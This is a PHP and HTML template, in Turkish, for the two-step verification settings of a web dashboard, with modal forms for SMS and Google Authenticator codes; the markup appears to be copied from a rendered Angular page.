<?php
if ($detect->isMobile()) {?>
<?php }else {?>
    <main>
   <router-outlet></router-outlet>
   <app-dashboard class="ng-star-inserted">
      <div class="container dshbrd-cntr">
         <div class="row">
            <?php include 'modules/sidebar.php' ?>
            <div class="col s9 rght-cntnt">
               <router-outlet></router-outlet>
               <app-user-security class="ng-star-inserted">
                  <div class="user-security-cntnt">
                     <div class="dshbrd-mdl">
                        <div class="mdl-hdr">
                           <div class="inf-hdr"><i class="fa fa-qrcode fa-fw"></i><span class="inf-title">İki adımlı doğrulama</span></div>
                        </div>
                        <div class="mdl-cntnt">
                           <app-static-inner-content contentcode="otp_info">
                              <!---->
                           </app-static-inner-content>
                           <div class="radio-field ng-star-inserted">
                              <h5 class="radio-hdr">Doğrulama tipi</h5>
                              <div class="radio-cntnt">
                                 <div class="radio-grp"><input name="twoStepAuthentication" type="radio" id="GA" value="gaValidation"><label for="GA">Google Authenticator</label></div>
                                 <div class="radio-grp ng-star-inserted"><input name="twoStepAuthentication" type="radio" id="sms" value="smsValidation"><label for="sms">SMS</label></div>
                                 <!---->
                              </div>
                           </div>
                           <!----><!----><!----><!----><!---->
                        </div>
                     </div>
                  </div>
                  <div id="smsModal" materialize="modal" class="modal modal-sm open dshbrd-modal" style="z-index: 1131;">
                     <div class="modal-content">
                        <div class="modul-accordion">
                           <div class="modal-close-button"><a><i class="fa fa-times right"></i></a></div>
                        </div>
                        <div class="modul-content">
                           <b>Lütfen sistemde kayıtlı telefon numaranıza gelen SMS deki doğrulama kodunu giriniz.</b>
                           <form novalidate="" class="ng-untouched ng-pristine ng-invalid">
                              <div class="input-field"><input id="SmsCode" name="smsCode" type="password" required="" maxlength="6" class="browser-default ng-untouched ng-pristine ng-invalid" placeholder="SMS şifresi"></div>
                              <div class="remaning-time-cntnt"><span class="remaning-time"> Kalan Süre:  sn. </span><a href="javascript:;" class="right disabled"> SMS şifremi tekrar gönder <i class="fa fa-refresh fa-fw fa-spin"></i></a></div>
                              <button type="submit" class="btn" disabled="">Gönder</button>
                           </form>
                        </div>
                     </div>
                  </div>
                  <div id="gaModal" materialize="modal" class="modal modal-sm open dshbrd-modal" style="z-index: 1133;">
                     <div class="modal-content">
                        <div class="modul-accordion">
                           <div class="modal-close-button"><a><i class="fa fa-times right"></i></a></div>
                        </div>
                        <div class="modul-content">
                           <b>Lütfen Google Authenticator şifrenizi giriniz</b>
                           <form novalidate="" class="ng-untouched ng-pristine ng-invalid">
                              <div class="input-field"><input id="OtpPassword" name="otpPassword" type="text" required="" class="browser-default ng-untouched ng-pristine ng-invalid" placeholder="Google Authenticator Şifresi"></div>
                              <button type="submit" class="btn" disabled="">Gönder</button>
                           </form>
                        </div>
                     </div>
                  </div>
               </app-user-security>
               <!---->
            </div>
         </div>
      </div>
   </app-dashboard>
   <!---->
</main>
<?php }?>